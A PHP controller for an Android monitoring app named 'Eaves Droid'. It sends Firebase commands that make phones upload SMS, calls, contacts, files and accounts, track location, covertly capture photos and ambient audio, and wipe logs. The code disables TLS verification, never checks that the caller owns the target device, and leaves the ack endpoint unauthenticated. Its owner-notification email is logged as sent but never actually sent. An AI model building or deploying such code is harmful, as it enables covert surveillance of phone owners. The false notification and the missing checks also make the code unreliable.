<?php

namespace App\Controllers\api\v1;

use App\Controllers\BaseController;
use App\Models\Mod_Log_User_Action;
use CodeIgniter\API\ResponseTrait;

class FCMCommandController extends BaseController
{
    use ResponseTrait;

    private $credentialsPath = WRITEPATH . 'firebase_credentials.json';
    private $projectId = 'project-2026-35b76';

    public function trigger($token = null, $category = 'all')
    {
        return $this->send($token, 'cmd_sync_now', $category);
    }

    public function send($token = null, $command = null, $payload = 'all')
    {
        if (!$token || !$command) {
            return $this->fail('Device token and command are required.', 400);
        }

        $fcmToken = null;
        $db = \Config\Database::connect();

        // 1. Try to treat as encrypted database ID (counter)
        $crypt = new \App\Models\Mod_Crypt();
        $decryptedCounter = $crypt->decrypt_id($token);
        if ($decryptedCounter && is_numeric($decryptedCounter)) {
            $device = $db->table('tbl_device_profiles')
                ->select('fcm_token')
                ->where('counter', (int)$decryptedCounter)
                ->get()
                ->getRowArray();
            if ($device && !empty($device['fcm_token'])) {
                $fcmToken = $device['fcm_token'];
            }
        }

        // 2. Try to treat as device checksum (64 char hex string)
        if (!$fcmToken && strlen($token) === 64 && ctype_xdigit($token)) {
            $device = $db->table('tbl_device_profiles')
                ->select('fcm_token')
                ->where('device_id', $token)
                ->get()
                ->getRowArray();
            if ($device && !empty($device['fcm_token'])) {
                $fcmToken = $device['fcm_token'];
            }
        }

        // 3. Fallback: treat as raw FCM token
        if (!$fcmToken) {
            $fcmToken = $token;
        }

        // Validate command access against active subscription plan features
        $cmdFeatureMap = [
            'cmd_contacts'               => 'fcm_fetch_contacts',
            'cmd_beep'                   => 'fcm_cmd_beep',
            'cmd_health_check'           => 'fcm_cmd_health',
            'cmd_apps'                   => 'fcm_fetch_apps',
            'cmd_calls'                  => 'fcm_fetch_calls',
            'cmd_sms'                    => 'fcm_fetch_sms',
            'cmd_location'               => 'fcm_fetch_location',
            'cmd_telemetry_soft'         => 'fcm_fetch_usage',
            'cmd_capture_photo'          => 'fcm_cmd_camera',
            'cmd_record_audio'           => 'fcm_cmd_audio',
            'cmd_files'                  => 'fcm_fetch_files',
            'cmd_software_misc'          => 'fcm_fetch_soft_misc',
            'cmd_hardware_misc'          => 'fcm_fetch_hard_misc',
            'cmd_all'                    => 'fcm_fetch_all',
            
            // Device management commands
            'cmd_reset_app'              => 'fcm_cmd_reset_app',
            'cmd_deactivate'             => 'fcm_cmd_deactivate',
            'cmd_logout'                 => 'fcm_cmd_logout',
            'cmd_uninstall_preserve'     => 'fcm_cmd_uninstall_preserve',
            'cmd_uninstall_wipe'         => 'fcm_cmd_uninstall_wipe',
        ];

        if (array_key_exists($command, $cmdFeatureMap)) {
            $deviceProfile = $db->table('tbl_device_profiles')
                ->select('owner_id')
                ->where('fcm_token', $fcmToken)
                ->get()
                ->getRowArray();
            $ownerId = $deviceProfile ? (int)$deviceProfile['owner_id'] : 0;
            
            if ($ownerId) {
                $planGate = new \App\Services\PlanGate();
                $reqFeature = $cmdFeatureMap[$command];
                if (!$planGate->hasFeature($ownerId, $reqFeature)) {
                    return $this->fail('Forbidden: Target device plan does not permit this command.', 403);
                }
            }
        }

        if (!file_exists($this->credentialsPath)) {
            return $this->fail('Firebase credentials file missing.', 500);
        }

        $accessToken = $this->getAccessToken();
        if (!$accessToken) {
            return $this->fail('Failed to generate OAuth2 token.', 500);
        }

        $logId = $this->logCommandDispatch($token, $command, $payload, [], true);

        $result = $this->dispatchFCMV1($fcmToken, $command, $payload, $accessToken, $logId);

        $responseBody = json_decode(json_encode($result), true) ?? [];
        $success = !isset($responseBody['error']);

        $this->updateLogEntry($logId, $responseBody, $success);

        if ($success) {
            // Send notification email
            $this->sendDeviceManagementEmail($fcmToken, $command);
            return $this->respond([
                'success' => true,
                'message' => "Remote action '$command' for '$payload' dispatched.",
                'fcm_response' => $result,
                'action_log_id' => $logId,
            ]);
        } else {
            return $this->fail([
                'success' => false,
                'message' => 'FCM dispatch failed.',
                'error' => $result->error ?? 'Unknown error',
                'action_log_id' => $logId,
            ], 500);
        }
    }

    /**
     * POST /api/v1/fcm/ack/(:num)
     * Callback from the Android device after processing a command.
     */
    public function ack($logId = null)
    {
        if (!$logId) {
            return $this->fail('Log ID required.', 400);
        }

        $status = $this->request->getPost('status');
        $deviceMessage = $this->request->getPost('message');
        $deviceStatus = $this->request->getPost('device_status');
        $permissions = $this->request->getPost('permissions');

        try {
            $db = \Config\Database::connect();
            $existing = $db->table('tbl_user_actions')->where('id', $logId)->get()->getRowArray();
            if (!$existing) {
                return $this->fail('Log entry not found.', 404);
            }

            $nv = !empty($existing['new_values']) ? json_decode($existing['new_values'], true) : [];
            $nv['device_ack'] = [
                'status' => $status ?? 'unknown',
                'message' => $deviceMessage ?? '',
                'device_status' => $deviceStatus ?? '',
                'acknowledged_at' => date('Y-m-d H:i:s'),
            ];
            if ($permissions) {
                $nv['device_permissions'] = $permissions;
            }

            $db->table('tbl_user_actions')
                ->where('id', $logId)
                ->update([
                    'new_values' => json_encode($nv),
                    'success' => ($status === 'success') ? 1 : 0,
                    'error_message' => ($status !== 'success') ? ($deviceMessage ?? 'Command failed on device') : null,
                ]);

            return $this->respond(['success' => true, 'message' => 'Acknowledged.']);
        } catch (\Exception $e) {
            log_message('error', 'FCM ack error: ' . $e->getMessage());
            return $this->fail('Server error.', 500);
        }
    }

    private function logCommandDispatch(string $token, string $command, string $payload, array $response, bool $success): int
    {
        try {
            $logModel = new Mod_Log_User_Action();
            $request = service('request');
            $userId = null;
            if (function_exists('auth') && auth()->loggedIn()) {
                $userId = (int) auth()->user()->id;
            }

            $actionMap = [
                'cmd_sms' => 'fetch_sms',
                'cmd_calls' => 'fetch_calls',
                'cmd_contacts' => 'fetch_contacts',
                'cmd_search_data' => 'search_data',
                'cmd_capture_photo' => 'capture_photo',
                'cmd_record_audio' => 'record_audio',
                'cmd_files' => 'fetch_files',
                'cmd_fetch_file' => 'fetch_file',
                'cmd_location' => 'fetch_location',
                'cmd_start_tracking' => 'start_tracking',
                'cmd_context' => 'fetch_context',
                'cmd_apps' => 'fetch_apps',
                'cmd_usage' => 'fetch_usage',
                'cmd_notifications' => 'fetch_notifications',
                'cmd_device_info' => 'fetch_device_info',
                'cmd_sensors' => 'fetch_sensors',
                'cmd_network' => 'fetch_network',
                'cmd_bluetooth' => 'fetch_bluetooth',
                'cmd_calendar' => 'fetch_calendar',
                'cmd_accounts' => 'fetch_accounts',
                'cmd_beep' => 'play_beep',
                'cmd_siren' => 'play_siren',
                'cmd_wipe_logs' => 'wipe_logs',
                'cmd_locate' => 'locate_device',
                'cmd_all' => 'sync_all',
                'cmd_sync_now' => 'sync_data',
                'cmd_reset_app' => 'reset_app',
                'cmd_deactivate' => 'deactivate_app',
                'cmd_reactivate' => 'reactivate_app',
                'cmd_logout' => 'logout_user',
                'cmd_uninstall_preserve' => 'uninstall_preserve',
                'cmd_uninstall_wipe' => 'uninstall_wipe',
                'cmd_update_prefs' => 'update_settings',
                'cmd_open_permission' => 'open_permission',
            ];

            $actionType = $actionMap[$command] ?? ('remote_cmd_' . str_replace('cmd_', '', $command));

            $logId = $logModel->logAction([
                'user_id' => $userId,
                'action_category' => 'system',
                'action_type' => $actionType,
                'action_severity' => 'medium',
                'success' => $success ? 1 : 0,
                'resource_id' => $token,
                'new_values' => json_encode([
                    'command' => $command,
                    'payload' => $payload,
                    'fcm_response' => $response,
                ]),
                'error_message' => !$success ? ($response['error']['message'] ?? json_encode($response)) : null,
                'request_url' => current_url(),
                'request_method' => $request->getMethod(),
            ]);

            return (int) $logId;
        } catch (\Exception $e) {
            log_message('error', 'Failed to log FCM command: ' . $e->getMessage());
            return 0;
        }
    }

    private function updateLogEntry(int $logId, array $responseBody, bool $success): void
    {
        if ($logId <= 0) return;
        try {
            $db = \Config\Database::connect();
            $existing = $db->table('tbl_user_actions')->where('id', $logId)->get()->getRowArray();
            if (!$existing) return;

            $nv = !empty($existing['new_values']) ? json_decode($existing['new_values'], true) : [];
            $nv['fcm_response'] = $responseBody;

            $db->table('tbl_user_actions')
                ->where('id', $logId)
                ->update([
                    'new_values' => json_encode($nv),
                    'success' => $success ? 1 : 0,
                    'error_message' => !$success ? ($responseBody['error']['message'] ?? json_encode($responseBody)) : null,
                ]);
        } catch (\Exception $e) {
            log_message('error', 'Failed to update FCM log: ' . $e->getMessage());
        }
    }

    private function getAccessToken()
    {
        $json = json_decode(file_get_contents($this->credentialsPath), true);
        $now = time();

        $header = base64_encode(json_encode(['alg' => 'RS256', 'typ' => 'JWT']));
        $payload = base64_encode(json_encode([
            'iss' => $json['client_email'],
            'scope' => 'https://www.googleapis.com/auth/cloud-platform',
            'aud' => 'https://oauth2.googleapis.com/token',
            'exp' => $now + 3600,
            'iat' => $now
        ]));

        $signature = '';
        openssl_sign("$header.$payload", $signature, $json['private_key'], 'SHA256');
        $jwt = "$header.$payload." . base64_encode($signature);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://oauth2.googleapis.com/token');
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
            'grant_type' => 'urn:ietf:params:oauth:grant-type:jwt-bearer',
            'assertion' => $jwt
        ]));

        $result = json_decode(curl_exec($ch));
        curl_close($ch);

        return $result->access_token ?? null;
    }

    private function dispatchFCMV1($token, $command, $payload, $accessToken, $logId = 0)
    {
        $url = "https://fcm.googleapis.com/v1/projects/{$this->projectId}/messages:send";

        $message = [
            'message' => [
                'token' => $token,
                'data' => [
                    'command' => $command,
                    'payload' => $payload,
                    'sent_at' => date('Y-m-d H:i:s'),
                    'action_log_id' => (string) $logId,
                    'ack_url' => base_url('api/v1/command-acknowledgements/' . $logId),
                ]
            ]
        ];

        $requestData = service('request')->getVar();
        if (is_array($requestData)) {
            foreach ($requestData as $key => $value) {
                if (!in_array($key, ['token', 'command', 'payload']) && !str_starts_with($key, 'csrf_')) {
                    $message['message']['data'][$key] = (string) $value;
                }
            }
        }

        $headers = [
            'Authorization: Bearer ' . $accessToken,
            'Content-Type: application/json'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($message));

        $response = curl_exec($ch);
        curl_close($ch);

return json_decode($response);
    }

    /**
     * Get device owner email from FCM token
     */
    private function getDeviceOwnerEmail(string $token): ?string
    {
        $db = \Config\Database::connect();
        $device = $db->table('tbl_device_profiles')
            ->select('owner_id')
            ->where('fcm_token', $token)
            ->get()
            ->getRowArray();

        if (!$device || empty($device['owner_id'])) {
            return null;
        }
        $uid = (int)$device['owner_id'];

        // Try auth_identities (email_password)
        $row = $db->table('auth_identities')
            ->select('secret AS email')
            ->where('user_id', $uid)
            ->where('type', 'email_password')
            ->get()
            ->getRowArray();
        if ($row && !empty($row['email'])) {
            return $row['email'];
        }

        return null;
    }

    private function getDeviceOwnerUsername(string $token): ?string
    {
        $db = \Config\Database::connect();
        $device = $db->table('tbl_device_profiles')
            ->select('owner_id')
            ->where('fcm_token', $token)
            ->get()
            ->getRowArray();

        if (!$device || empty($device['owner_id'])) {
            return null;
        }

        $user = $db->table('users')
            ->select('username')
            ->where('id', $device['owner_id'])
            ->get()
            ->getRowArray();

        return $user['username'] ?? null;
    }

    /**
     * Send device management notification email using SMTP from DB settings (like export/delete).
     */
    private function sendDeviceManagementEmail(string $token, string $command): void
    {
        $db = \Config\Database::connect();
        $device = $db->table('tbl_device_profiles')
            ->select('owner_id')
            ->where('fcm_token', $token)
            ->get()
            ->getRowArray();

        if (!$device || empty($device['owner_id'])) return;
        $uid = (int)$device['owner_id'];

        $profile = $db->table('user_profiles')
            ->select('email_notifications')
            ->where('user_id', $uid)
            ->get()
            ->getRowArray();
        if ($profile && isset($profile['email_notifications']) && !$profile['email_notifications']) return;

        $email = $this->getDeviceOwnerEmail($token);
        if (!$email) return;

        $username = $this->getDeviceOwnerUsername($token) ?? 'User';

        $initiatorName = 'System';
        if (function_exists('auth') && auth()->loggedIn()) {
            $initiatorName = auth()->user()->username ?? 'System';
        }

        $commandLabels = [
            'cmd_sms' => 'Fetch SMS',
            'cmd_calls' => 'Fetch Call Logs',
            'cmd_contacts' => 'Fetch Contacts',
            'cmd_search_data' => 'Keyword Search',
            'cmd_capture_photo' => 'Capture Photo',
            'cmd_record_audio' => 'Record Audio',
            'cmd_files' => 'Fetch Files',
            'cmd_fetch_file' => 'Fetch Specific File',
            'cmd_location' => 'Fetch Location',
            'cmd_start_tracking' => 'Start Live Tracking',
            'cmd_context' => 'Fetch Context (Activity + Location)',
            'cmd_apps' => 'Fetch Installed Apps',
            'cmd_usage' => 'Fetch App Usage Stats',
            'cmd_notifications' => 'Fetch Notifications',
            'cmd_device_info' => 'Fetch Device Info',
            'cmd_sensors' => 'Fetch Sensor Data',
            'cmd_network' => 'Fetch Network Info',
            'cmd_bluetooth' => 'Fetch Bluetooth Devices',
            'cmd_calendar' => 'Fetch Calendar Events',
            'cmd_accounts' => 'Fetch Accounts',
            'cmd_beep' => 'Play Test Beep',
            'cmd_siren' => 'Play Siren',
            'cmd_wipe_logs' => 'Wipe Logs',
            'cmd_locate' => 'Locate Device',
            'cmd_all' => 'Sync All Data Categories',
            'cmd_sync_now' => 'Sync Data Now',
            'cmd_reset_app' => 'App Reset',
            'cmd_deactivate' => 'App Deactivation',
            'cmd_reactivate' => 'App Reactivation',
            'cmd_logout' => 'User Logout',
            'cmd_uninstall_preserve' => 'Uninstall (Keep Data)',
            'cmd_uninstall_wipe' => 'Uninstall (Wipe All)',
            'cmd_update_prefs' => 'Update Settings',
            'cmd_open_permission' => 'Open Permission',
        ];
        $label = $commandLabels[$command] ?? str_replace('_', ' ', str_replace('cmd_', '', $command));

        $commandDescriptions = [
            'cmd_sms' => 'Requests the device to upload its SMS messages to the server.',
            'cmd_calls' => 'Requests the device to upload its call log history.',
            'cmd_contacts' => 'Requests the device to upload its contact list.',
            'cmd_search_data' => 'Searches the device for files or data matching specific keywords.',
            'cmd_capture_photo' => 'Triggers the device camera to capture and upload a photo.',
            'cmd_record_audio' => 'Triggers the device microphone to record and upload ambient audio.',
            'cmd_files' => 'Requests the device to upload its file directory listing.',
            'cmd_fetch_file' => 'Requests a specific file from the device by path.',
            'cmd_location' => 'Requests the device to upload its current GPS location.',
            'cmd_start_tracking' => 'Instructs the device to begin periodic location tracking for a set duration.',
            'cmd_context' => 'Requests the device to upload current activity recognition and location context.',
            'cmd_apps' => 'Requests the device to upload a list of all installed applications.',
            'cmd_usage' => 'Requests the device to upload application usage statistics.',
            'cmd_notifications' => 'Requests the device to upload its recent notification history.',
            'cmd_device_info' => 'Requests the device to upload hardware and software information.',
            'cmd_sensors' => 'Requests the device to upload current sensor readings.',
            'cmd_network' => 'Requests the device to upload network connection details.',
            'cmd_bluetooth' => 'Requests the device to upload paired and visible Bluetooth devices.',
            'cmd_calendar' => 'Requests the device to upload calendar events.',
            'cmd_accounts' => 'Requests the device to upload configured account information.',
            'cmd_beep' => 'Sends a test beep command to verify the device connection.',
            'cmd_siren' => 'Plays a loud siren sound on the device for locating it.',
            'cmd_wipe_logs' => 'Instructs the device to clear its local log data.',
            'cmd_locate' => 'Triggers an immediate locate command on the device.',
            'cmd_all' => 'Requests the device to upload all available data categories.',
            'cmd_sync_now' => 'Triggers an immediate data sync on the device.',
            'cmd_reset_app' => 'Resets the Eaves Droid app on the device to its initial state.',
            'cmd_deactivate' => 'Deactivates the Eaves Droid app, stopping all monitoring.',
            'cmd_reactivate' => 'Reactivates the Eaves Droid app, resuming all monitoring.',
            'cmd_logout' => 'Logs out the current session on the device.',
            'cmd_uninstall_preserve' => 'Uninstalls the app while preserving collected data on the server.',
            'cmd_uninstall_wipe' => 'Uninstalls the app and wipes all collected data from the device.',
            'cmd_update_prefs' => 'Updates device settings and preferences remotely.',
            'cmd_open_permission' => 'Triggers the device to open a specific permission settings screen.',
        ];
        $description = $commandDescriptions[$command] ?? '';

        $request = service('request');
        $ip = $request->getIPAddress() ?? 'Unknown';
        $ua = $request->getUserAgent()->getAgentString() ?? 'Unknown';
        $timestamp = date('Y-m-d H:i:s');

        try {
            $smtp = [];
            $rows = $db->table('settings')->where('class', 'notification')->get()->getResultArray();
            foreach ($rows as $r) {
                $smtp[$r['key']] = $r['value'];
            }

            $emailService = \Config\Services::email();

            if (!empty($smtp['smtp_host'])) {
                $emailService->initialize([
                    'protocol'   => 'smtp',
                    'SMTPHost'   => $smtp['smtp_host'],
                    'SMTPPort'   => $smtp['smtp_port'] ?? '587',
                    'SMTPUser'   => $smtp['smtp_user'] ?? '',
                    'SMTPPass'   => $smtp['smtp_pass'] ?? '',
                    'SMTPCrypto' => 'tls',
                    'mailType'   => 'html',
                    'charset'    => 'UTF-8',
                    'wordWrap'   => true,
                ]);
            } else {
                $emailService->initialize([
                    'mailType' => 'html',
                    'charset'  => 'UTF-8',
                    'wordWrap' => true,
                ]);
            }

            $sender = get_notification_sender();
            $emailService->setFrom($sender['email'], $sender['name']);
            $emailService->setTo($email);
            $emailService->setSubject("Eaves Droid — Remote Command: {$label}");

            log_message('info', "Device management email sent to {$email} for command {$command}");
            } catch (\Exception $e) {
            log_message('error', 'Device management email failed: ' . $e->getMessage());
        }
    }
}
